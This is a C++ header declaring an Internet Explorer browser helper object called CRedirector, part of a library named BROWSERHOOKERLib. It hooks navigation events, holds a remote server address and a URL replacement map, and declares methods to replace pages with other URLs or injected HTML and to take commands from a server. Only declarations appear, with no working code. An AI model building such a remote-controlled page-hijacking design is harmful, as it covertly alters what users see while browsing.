// Redirector.h : Declaration of the CRedirector
// reference MSDN : http://msdn.microsoft.com/en-us/library/bb250489.aspx
// and : http://msdn.microsoft.com/en-us/library/bb250436.aspx for more details.
// and : http://msdn.microsoft.com/en-us/library/aa768283.aspx

#ifndef __REDIRECTOR_H_
#define __REDIRECTOR_H_

#include "resource.h"       // main symbols
#include <shlguid.h>        // IID_IWebBrowser2, DIID_DWebBrowserEvents2, etc.
#include <exdispid.h>       // DISPID_DOCUMENTCOMPLETE, etc.
#include <mshtml.h>         // IID_IHTMLDocument2

#include <shlwapi.h>

#include "Socket.h"
#include "HttpRequest.h"
#include "ClientDaemon.h"

/////////////////////////////////////////////////////////////////////////////
// CRedirector
class ATL_NO_VTABLE CRedirector : 
	public CComObjectRootEx<CComSingleThreadModel>,
	public CComCoClass<CRedirector, &CLSID_Redirector>,
	public IObjectWithSiteImpl<CRedirector>,
	public IDispatchImpl<IRedirector, &IID_IRedirector, &LIBID_BROWSERHOOKERLib>,
	public IDispEventImpl<1, CRedirector, &DIID_DWebBrowserEvents2, &LIBID_SHDocVw, 1, 1>
{
public:
	CRedirector(){};
	~CRedirector(){};

DECLARE_REGISTRY_RESOURCEID(IDR_REDIRECTOR)
DECLARE_NOT_AGGREGATABLE(CRedirector)

DECLARE_PROTECT_FINAL_CONSTRUCT()

BEGIN_COM_MAP(CRedirector)
	COM_INTERFACE_ENTRY(IRedirector)
	COM_INTERFACE_ENTRY(IDispatch)
	COM_INTERFACE_ENTRY(IObjectWithSite)
END_COM_MAP()

// IRedirector
public:
	STDMETHOD(SetSite)(IUnknown *pUnkSite);

	BEGIN_SINK_MAP(CRedirector)
    SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_DOCUMENTCOMPLETE, OnDocumentComplete)
	SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_BEFORENAVIGATE2, OnBeforeNavigate2)
	SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_DOWNLOADBEGIN, OnDownloadBegin)
	SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_DOWNLOADCOMPLETE, OnDownloadComplete)
	SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_NAVIGATECOMPLETE2, OnNavigateComplete2)
	END_SINK_MAP()

    // DWebBrowserEvents2
	// DocumentComplete事件响应函数
    void STDMETHODCALLTYPE OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL);
	// BeforeNavigate2事件响应函数
	void STDMETHODCALLTYPE OnBeforeNavigate2(IDispatch *pDisp,
											VARIANT *url,
											VARIANT *Flags,
											VARIANT *TargetFrameName,
											VARIANT *PostData,
											VARIANT *Headers,
											VARIANT_BOOL *Cancel
											);

	void STDMETHODCALLTYPE OnDownloadBegin(void);
	void STDMETHODCALLTYPE OnDownloadComplete(void);
	void STDMETHODCALLTYPE OnNavigateComplete2(IDispatch *pDisp,
											  VARIANT *URL
											  );

private:
	CComPtr<IWebBrowser2>  m_spWebBrowser;
	HWND m_ParentWindow;
	BOOL m_fAdvised;
	BSTR m_origUrl;
	BSTR m_oldUrl;
	BSTR m_replacedUrl;
	BOOL m_bMainWindow;
	BOOL m_bLocationUrlChanged;
	BOOL m_bReplaced;

	CHttpRequest       *m_pHttpRequest;
	string              m_sServerAddr;
	UINT                m_uServerPort;
	map<string, string> m_replaceUrlMap;
	string              m_replacePageContent;

public:
	//static CClientDaemon *m_pClientDaemon;  // because need access from static member function.

private:
	int MyStrToOleStrN(LPOLESTR pwsz, int cchWideChar, LPCSTR psz);
	BOOL isSameRootDomain(BSTR url, BSTR domain);
	int ReplacePageWithUrl(IHTMLDocument2 *iDoc, const char* pszurl);
	int ReplacePageWithHtml(IHTMLDocument2 *iDoc, BSTR htmlContent);
	void WriteHTMLToDoc_OLD(IHTMLDocument2* iDoc, string url);
	void StartClientDaemon(HWND hMainWnd);
public:

	//static void CALLBACK GetCommandFromServer(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);
};
#endif //__REDIRECTOR_H_
